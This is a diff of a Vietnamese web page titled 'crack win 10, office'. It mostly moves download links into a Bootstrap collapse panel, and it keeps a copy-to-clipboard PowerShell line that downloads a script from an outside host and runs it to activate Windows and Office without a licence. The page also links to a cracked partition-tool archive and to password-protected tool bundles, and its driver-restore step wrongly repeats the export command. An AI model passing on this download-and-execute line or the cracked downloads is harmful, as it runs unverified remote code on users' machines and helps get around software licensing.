@@ -1,84 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>crack win 10, office</title>
-  </head>
-  <body>
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <title>crack win 10, office</title>
+</head>
+
+<body>
+  <div class="p-3">
     <h4>
       <div class="copy-box">
-        <span id="textToCopy"
-          >iex ((New-Object
+        <span id="textToCopy">iex ((New-Object
           Net.WebClient).DownloadString('https://get.activated.win'))</span>
-      <br>
-        <div class="copy-icon" onclick="copyText()">Bấm icon 📋 để copy</div>
+        <br>
+        <div class="copy-icon" onclick="copyText()">Copy text 📋 </div>
       </div>
     </h4>
-    <h4>
-      <a href="Wub.zip">Tải WUD tắt update</a>
+    <div>
+      <div>
+        <p>câu lệnh backup driver</p>
+        <p><code>$backup = "C:\DriverBackup"</code></p>
+        <p><code>Export-WindowsDriver -Online -Destination $backup</code></p>
+        <p>câu lệnh cài driver đã backup</p>
+        <p><code>Export-WindowsDriver -Online -Destination $backup</code></p>
+      </div>
+      
+      
     </h4>
-    <h4>
-      <a href="Tien_ich_cai_Win_dao_v2.1.4.1.zip">Tải Tiện ích cài win dạo (pass 123 hoặc haido)</a>
-    </h4>
-    <h4>
-      <a href="keyboardtestutility.exe">keyboardtest.exe</a>
-    </h4>
-    <h4>
-      <a href="hdsentinel_setup.zip">hdsentinel_setup.zip</a>
-    </h4>
-    <h4>
-      <a href="MiniTool_Partition_Wizard_Pro_Ultimate_12.8.zip">MiniTool_Partition_Wizard_Pro</a>
-    </h4>
-    <h4>
-      <a href="BatteryBarSetup-3-6-6.exe">BatteryBarSetup-3-6-6.exe</a>
-    </h4>
-    <h4>
-      <a href="Ntfs_drive_protection.zip">Ntfs_drive_protection.zip đóng băng USB</a>
-    </h4>
-    <h4>
-      <a href="Advanced_IP_Scanner_2.5.4594.1.exe">Advanced_IP_Scanner_2.5.4594.1.exe</a>
-    </h4>
-    <h4>
-      <a href="FIX-709.rar">Tải fix 709 LIEMK</a>
-    </h4>
-    <h4>
-      <a href="caidatfonttiengviet.exe">Tải caidatfonttiengviet.exe</a>
-      <a href="TCVN3-VNI.zip">Tải TCVN3-VNI.zip</a>
-    </h4>
+    <p>
+      <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#collapseExample"
+        aria-expanded="false" aria-controls="collapseExample">
+        Ứng dụng test máy
+      </button>
+    </p>
+    <div class="collapse" id="collapseExample">
+      <div class="card card-body">
+        <h4>
+          <a href="Wub.zip">Tải WUD tắt update</a>
+        </h4>
+        <h4>
+          <a href="Tien_ich_cai_Win_dao_v2.1.4.1.zip">Tải Tiện ích cài win dạo (pass 123 hoặc haido)</a>
+        </h4>
+        <h4>
+          <a href="keyboardtestutility.exe">keyboardtest.exe</a>
+        </h4>
+        <h4>
+          <a href="hdsentinel_setup.zip">hdsentinel_setup.zip</a>
+        </h4>
+        <h4>
+          <a href="MiniTool_Partition_Wizard_Pro_Ultimate_12.8.zip">MiniTool_Partition_Wizard_Pro</a>
+        </h4>
+        <h4>
+          <a href="BatteryBarSetup-3-6-6.exe">BatteryBarSetup-3-6-6.exe</a>
+        </h4>
+        <h4>
+          <a href="Ntfs_drive_protection.zip">Ntfs_drive_protection.zip đóng băng USB</a>
+        </h4>
+        <h4>
+          <a href="Advanced_IP_Scanner_2.5.4594.1.exe">Advanced_IP_Scanner_2.5.4594.1.exe</a>
+        </h4>
+        <h4>
+          <a href="LocalSend-1.17.0-windows-x86-64.exe">Localsend chia sẻ dữ liệu qua wifi</a>
+        </h4>
+        <h4>
+          <a href="SDIO_1.17.2.823.zip">Ứng dụng cập nhật driver (ngon hơn "driver manager")</a>
+        </h4>
+        <h4>
+          <a href="FIX-709.rar">Tải fix 709 LIEMK</a>
+        </h4>
+        <h4>
+          <a href="caidatfonttiengviet.exe">Tải caidatfonttiengviet.exe</a>
+          <a href="TCVN3-VNI.zip">Tải TCVN3-VNI.zip</a>
+        </h4>
+      </div>
+    </div>
+  </div>
 
-    <style>
-      .copy-box {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        font-size: 16px;
-      }
 
-      .copy-icon {
-        cursor: pointer;
-        padding: 4px;
-        border-radius: 4px;
-      }
 
-      .copy-icon:hover {
-        background-color: #eee;
-      }
-    </style>
+  <style>
+    .copy-box {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 16px;
+    }
 
-    <script>
-      function copyText() {
-        const text = document.getElementById("textToCopy").innerText;
+    .copy-icon {
+      cursor: pointer;
+      padding: 4px;
+      border-radius: 4px;
+    }
 
-        navigator.clipboard
-          .writeText(text)
-          .then(() => {
-            alert("Đã copy!");
-          })
-          .catch((err) => {
-            console.error("Lỗi khi copy:", err);
-          });
-      }
-    </script>
-  </body>
+    .copy-icon:hover {
+      background-color: #eee;
+    }
+  </style>
+
+  <script>
+    function copyText() {
+      const text = document.getElementById("textToCopy").innerText;
+
+      navigator.clipboard
+        .writeText(text)
+        .then(() => {
+          alert("Đã copy!");
+        })
+        .catch((err) => {
+          console.error("Lỗi khi copy:", err);
+        });
+    }
+  </script>
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+    crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+    crossorigin="anonymous"></script>
+</body>
+
 </html>
